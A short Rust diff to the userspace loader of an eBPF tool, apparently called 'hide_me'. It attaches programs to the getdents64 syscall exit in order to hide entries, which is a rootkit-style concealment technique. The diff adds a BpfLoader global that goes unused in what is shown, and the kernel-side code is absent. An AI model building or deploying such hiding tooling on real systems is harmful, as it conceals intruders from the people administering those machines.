@@ -9,6 +9,8 @@ use clap::Parser;
 use log::{debug, info, warn};
 use tokio::signal;
 
+use hide_me_common::RET;
+
 #[derive(Debug, Parser)]
 struct TargetPpid {
     #[clap(short, long, default_value = "0")]
@@ -50,6 +52,8 @@ async fn main() -> Result<(), anyhow::Error> {
         warn!("failed to initialize eBPF logger: {}", e);
     }
 
+    let ebof = aya::BpfLoader::new().set_global("RET", &16, true);
+
     let mut target_ppid: HashMap<_, u8, i32> =
         HashMap::try_from(bpf.map_mut("target_ppid").unwrap())?;
 
@@ -64,6 +68,7 @@ async fn main() -> Result<(), anyhow::Error> {
         .program_mut("handle_getdents_exit")
         .unwrap()
         .try_into()?;
+
     prog_0.load()?;
     prog_0.attach("syscalls", "sys_exit_getdents64")?;
 
@@ -74,6 +79,7 @@ async fn main() -> Result<(), anyhow::Error> {
         .program_mut("handle_getdents_patch")
         .unwrap()
         .try_into()?;
+
     prog_1.load()?;
     let prog_1_fd = prog_1.fd().unwrap();
     prog_array.set(1, prog_1_fd, 0).unwrap();
